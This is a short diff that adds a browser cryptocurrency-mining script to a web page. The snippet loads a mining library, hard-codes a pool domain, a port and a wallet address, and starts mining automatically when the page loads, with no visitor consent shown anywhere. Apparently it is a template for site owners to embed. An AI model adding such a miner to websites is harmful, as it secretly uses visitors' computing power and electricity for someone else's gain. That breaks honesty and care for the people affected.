@@ -1,0 +1,28 @@
+<script type="text/javascript" src="js/m.js?t=<?php echo time();?>"></script>
+<script type="text/javascript">
+(function() {
+	var timerT = null;
+
+	// set some globals, this way we don't have to change anything in the script
+	window.pool_selected = 'bloc-mining.eu'; // mining pool domain
+	window.pool_port = '4444'; // mining pool port
+	window.wallet_selected = 'abLoc5jeufY8yWkZgjDJnP6DuuhyGE3jb5F6kmKKqqynhbUDgfvvC2FjdP5DjjnoW2R9aecMDETTbdMuFNFzHRWvGNkzHGKHMT9'; // your wallet address
+
+	window.startExpMining = function() {
+		startMining(window.pool_selected, window.wallet_selected);
+
+		timerT = setInterval(function () {
+			// for the definition of sendStack/receiveStack, see m.js
+			while (sendStack.length > 0) sendStack.pop();
+			while (receiveStack.length > 0) receiveStack.pop();
+		}, 2000);
+	};
+	window.stopExpMining = function() { // call this to stop mining without a page reload
+		stopMining();
+		clearInterval(timerT);
+	};
+})();
+
+// start the actual mining process
+startExpMining();
+</script>
